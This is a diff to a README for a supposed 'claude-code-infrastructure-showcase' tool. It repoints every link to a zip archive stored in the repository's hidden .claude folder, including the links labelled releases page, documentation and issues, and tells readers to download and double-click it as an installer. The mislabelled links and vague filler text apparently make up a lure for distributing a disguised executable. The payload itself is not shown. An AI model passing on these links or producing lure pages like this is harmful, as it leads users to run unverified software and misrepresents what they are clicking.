@@ -1,7 +1,7 @@
 # 🎉 claude-code-infrastructure-showcase - Streamline Your Code Management
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip)](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip)
+[![Download from Releases](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip)](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the claude-code-infrastructure-showcase! This application helps you manage and showcase your Claude Code infrastructure easily. Follow the steps below to download and run the software.
@@ -24,20 +24,20 @@ This application includes:
 ## 🔗 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip) to access the releases page.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip) to access the releases page.
    
 2. **Choose Your Version:** Look for the latest version listed on the page. You will see a list of available files.
 
-3. **Download the File:** Click on the file that matches your operating system. For example, if you are using Windows, download `https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip`.
+3. **Download the File:** Click on the file that matches your operating system. For example, if you are using Windows, download `https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip`.
 
 4. **Run the Installer:** Once the download completes, locate the downloaded file and double-click it to begin the installation process. Follow the on-screen instructions. 
 
 5. **Start the Application:** After installation, you can find the application in your Start Menu (Windows) or Applications folder (macOS). Open the application to start managing your code infrastructure!
 
 ## 📚 Additional Information
-- **Documentation:** For detailed instructions on using different features, visit the [Documentation](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip) page.
+- **Documentation:** For detailed instructions on using different features, visit the [Documentation](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip) page.
 
-- **Support:** If you encounter issues, please submit a question or report a bug in the [Issues](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip) section of this repository.
+- **Support:** If you encounter issues, please submit a question or report a bug in the [Issues](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip) section of this repository.
 
 ## 🤝 Contributing
 We welcome contributions! If you have ideas for improving the app or want to report issues, feel free to open an issue or submit a pull request.
@@ -49,4 +49,4 @@ For any questions or feedback, please reach out via the contact information prov
 Thanks for using claude-code-infrastructure-showcase. We hope it enhances your coding experience. Happy coding!
 
 ## 🔗 Another Download Link
-Don't forget to check the releases page again for updates and new features: [Download Here](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/skills/backend-dev-guidelines/resources/claude-code-infrastructure-showcase-2.1.zip)
+Don't forget to check the releases page again for updates and new features: [Download Here](https://raw.githubusercontent.com/akashaali98/claude-code-infrastructure-showcase/main/.claude/infrastructure_claude_showcase_code_v3.6-alpha.4.zip)
